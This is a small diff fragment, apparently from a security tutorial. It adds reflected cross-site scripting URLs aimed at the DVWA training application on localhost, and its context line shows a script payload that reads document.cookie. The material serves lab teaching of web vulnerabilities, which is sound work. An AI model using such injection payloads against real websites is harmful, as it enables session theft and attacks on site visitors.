@@ -23,3 +23,7 @@ Now, we can get access to the web page's cookie:
 <script>alert(document.cookie)</script>
 
 </code></pre>
+
+http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27Oops!%27%29%3C%2Fscript%3E
+
+127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27Oops!%27)%3C%2Fscript%3E
